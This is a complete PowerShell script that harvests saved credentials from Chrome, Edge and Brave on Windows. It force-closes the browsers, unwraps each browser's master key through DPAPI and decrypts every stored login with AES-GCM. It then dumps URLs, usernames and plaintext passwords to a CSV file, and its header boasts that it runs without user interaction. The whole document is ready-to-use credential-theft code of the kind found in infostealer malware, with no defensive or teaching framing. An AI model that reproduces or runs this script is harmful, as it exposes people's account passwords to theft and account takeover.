# Browser Password Extraction & Decryption Script
# Extracts and decrypts passwords from Chrome, Edge, and Brave browsers
# Handles modern AES-GCM encryption (v80+) and older DPAPI encryption
# Requires PowerShell 7+ and System.Data.SQLite NuGet package
# Runs automatically without user interaction

param(
    [switch]$ForceSQLiteReinstall,
    [string]$CSVPath = ".\DecryptedPasswords.csv"
)

# Function to install required dependencies (SQLite and System.Data.SQLite)
function Install-Dependencies {
    param([bool]$ForceReinstall = $false)
    
    # Check for SQLite3 binary
    if ((-not $ForceReinstall) -and (Test-Path ".\sqlite3.exe")) {
        Write-Host "SQLite3 found in current directory" -ForegroundColor Green
    } else {
        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
        try {
            $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
            $tempZip = "sqlite-temp.zip"
            Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
            Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
            Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
            Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
            Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "SQLite3 installed successfully." -ForegroundColor Green
        } catch {
            Write-Warning "Failed to install SQLite3: $($_.Exception.Message)"
            return $false
        }
    }

    # Install System.Data.SQLite NuGet package
    if ((-not $ForceReinstall) -and (Test-Path ".\System.Data.SQLite.dll")) {
        Write-Host "System.Data.SQLite found in current directory" -ForegroundColor Green
    } else {
        Write-Host "Downloading System.Data.SQLite..." -ForegroundColor Yellow
        try {
            Install-Package -Name System.Data.SQLite -ProviderName NuGet -Scope CurrentUser -Force -ErrorAction Stop
            $sqliteDll = (Get-Package -Name System.Data.SQLite).Source | Split-Path | Join-Path -ChildPath "lib\netstandard2.1\System.Data.SQLite.dll"
            Copy-Item $sqliteDll ".\System.Data.SQLite.dll" -Force
            Write-Host "System.Data.SQLite installed successfully." -ForegroundColor Green
        } catch {
            Write-Warning "Failed to install System.Data.SQLite: $($_.Exception.Message)"
            return $false
        }
    }
    return $true
}

# Function to decrypt data using Windows DPAPI (for older versions)
function Get-DecryptedData {
    param([byte[]]$EncryptedData)
    
    try {
        Add-Type -AssemblyName System.Security -ErrorAction Stop
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        Write-Warning "DPAPI decryption failed: $($_.Exception.Message)"
        return "[DPAPI Decryption Failed]"
    }
}

# Function to get master key from Local State
function Get-MasterKey {
    param([string]$LocalStatePath)
    
    if (-not (Test-Path $LocalStatePath)) {
        Write-Warning "Local State file not found: $LocalStatePath"
        return $null
    }
    
    try {
        $localStateJson = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
        $encryptedKeyBase64 = $localStateJson.os_crypt.encrypted_key
        $encryptedKeyBytes = [Convert]::FromBase64String($encryptedKeyBase64)
        $encryptedMasterKey = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)] # Remove "DPAPI" prefix
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedMasterKey, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return $masterKey
    } catch {
        Write-Warning "Failed to get master key: $($_.Exception.Message)"
        return $null
    }
}

# Function to decrypt modern passwords (v80+) using AES-GCM
function Get-DecryptedModernPassword {
    param(
        [byte[]]$EncryptedPasswordBytes,
        [byte[]]$MasterKey
    )
    
    try {
        if ($EncryptedPasswordBytes.Length -lt 3 -or 
            [System.Text.Encoding]::ASCII.GetString($EncryptedPasswordBytes[0..2]) -ne "v10") {
            return Get-DecryptedData $EncryptedPasswordBytes
        }
        
        $iv = $EncryptedPasswordBytes[3..14]
        $ciphertextLength = $EncryptedPasswordBytes.Length - 3 - 12 - 16
        $ciphertext = $EncryptedPasswordBytes[15..(15 + $ciphertextLength - 1)]
        $tag = $EncryptedPasswordBytes[($EncryptedPasswordBytes.Length - 16)..($EncryptedPasswordBytes.Length - 1)]
        
        $plaintext = New-Object byte[] $ciphertextLength
        $aesGcm = New-Object System.Security.Cryptography.AesGcm $MasterKey
        $aesGcm.Decrypt($iv, $ciphertext, $tag, $plaintext, $null)
        $aesGcm.Dispose()
        
        return [System.Text.Encoding]::UTF8.GetString($plaintext).TrimEnd([char]0)
    } catch {
        Write-Warning "AES-GCM decryption failed: $($_.Exception.Message)"
        return "[AES-GCM Decryption Failed]"
    }
}

# Function to extract and decrypt passwords from a browser
function Get-BrowserPasswords {
    param(
        [string]$BrowserName,
        [string]$DataPath
    )
    
    Write-Host "Processing $BrowserName..." -ForegroundColor Yellow
    
    $loginDataPath = Join-Path $DataPath "Default\Login Data"
    $localStatePath = Join-Path $DataPath "Local State"
    
    if (-not (Test-Path $loginDataPath)) {
        Write-Host "$BrowserName login database not found at $loginDataPath" -ForegroundColor DarkGray
        return @()
    }
    
    $masterKey = Get-MasterKey -LocalStatePath $localStatePath
    $results = @()
    
    try {
        # Load SQLite assembly
        Add-Type -Path ".\System.Data.SQLite.dll"
        
        # Connect to SQLite database
        $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $conn.ConnectionString = "Data Source=$loginDataPath"
        $conn.Open()
        
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $cmd = New-Object -TypeName System.Data.SQLite.SQLiteCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $username = if ($reader.IsDBNull(1)) { "" } else { $reader.GetString(1) }
            $passwordBytes = if ($reader.IsDBNull(2)) { $null } else { $reader.GetValue(2) -as [byte[]] }
            
            $decryptedPassword = ""
            if ($passwordBytes -and $passwordBytes.Length -gt 0) {
                try {
                    if ($masterKey -and $passwordBytes[0..2] -eq ([byte[]]@(0x76, 0x31, 0x30))) { # v10 prefix
                        $decryptedPassword = Get-DecryptedModernPassword -EncryptedPasswordBytes $passwordBytes -MasterKey $masterKey
                    } else {
                        $decryptedPassword = Get-DecryptedData $passwordBytes
                    }
                } catch {
                    $decryptedPassword = "[Decryption Error: $($_.Exception.Message)]"
                }
            } else {
                $decryptedPassword = "[No Password]"
            }
            
            $results += [PSCustomObject]@{
                Browser = $BrowserName
                URL = $url
                Username = $username
                Password = $decryptedPassword
                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
        }
        
        $reader.Close()
        $conn.Close()
    } catch {
        Write-Warning "Error processing $BrowserName data: $($_.Exception.Message)"
    }
    
    return $results
}

# Main execution
Write-Host "Browser Password Extraction & Decryption Tool" -ForegroundColor Green
Write-Host "=============================================`n" -ForegroundColor Green

# Check for PowerShell 7+
if ($PSVersionTable.PSVersion.Major -lt 7) {
    Write-Host "This script requires PowerShell 7 or later for AES-GCM decryption. Please run with 'pwsh.exe'." -ForegroundColor Red
    exit 1
}

# Automatically close browser processes
Write-Host "Attempting to close browser processes..." -ForegroundColor Yellow
$browserProcesses = @("chrome", "msedge", "brave")
foreach ($proc in $browserProcesses) {
    try {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Warning "Could not stop $proc processes: $($_.Exception.Message)"
    }
}

# Install dependencies
$depsInstalled = Install-Dependencies -ForceReinstall $ForceSQLiteReinstall
if (-not $depsInstalled) {
    Write-Host "Required dependencies could not be installed. Exiting." -ForegroundColor Red
    exit 1
}

# Define browser paths
$browsers = @(
    @{Name = "Google Chrome"; DataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{Name = "Microsoft Edge"; DataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{Name = "Brave Browser"; DataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
)

$allPasswords = @()

foreach ($browser in $browsers) {
    if (Test-Path $browser.DataPath) {
        $passwords = Get-BrowserPasswords -BrowserName $browser.Name -DataPath $browser.DataPath
        $allPasswords += $passwords
    } else {
        Write-Host "$($browser.Name) not found at $($browser.DataPath)" -ForegroundColor DarkGray
    }
}

# Display and export results
if ($allPasswords.Count -gt 0) {
    Write-Host "`nSuccessfully processed $($allPasswords.Count) password entries:`n" -ForegroundColor Green
    $allPasswords | Select-Object -First 10 | Format-Table -Property Browser, URL, Username, Password -AutoSize
    
    try {
        $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation
        Write-Host "`nAll passwords exported to: $CSVPath" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to export to CSV: $($_.Exception.Message)"
    }
    
    $browserStats = $allPasswords | Group-Object Browser | ForEach-Object {
        [PSCustomObject]@{
            Browser = $_.Name
            Passwords = $_.Count
        }
    }
    
    Write-Host "`nPassword Summary by Browser:" -ForegroundColor Cyan
    $browserStats | Format-Table -AutoSize
} else {
    Write-Host "`nNo passwords found or decrypted from any browser." -ForegroundColor Yellow
}

# Cleanup instructions
Write-Host "`nNotes:" -ForegroundColor Cyan
Write-Host "1. The sqlite3.exe and System.Data.SQLite.dll files remain in the current directory." -ForegroundColor Cyan
Write-Host "2. To save space, you can delete these files when done." -ForegroundColor Cyan
Write-Host "3. This script supports modern AES-GCM encryption (v80+)." -ForegroundColor Cyan
Write-Host "4. Requires PowerShell 7+ and admin rights for best results." -ForegroundColor Cyan
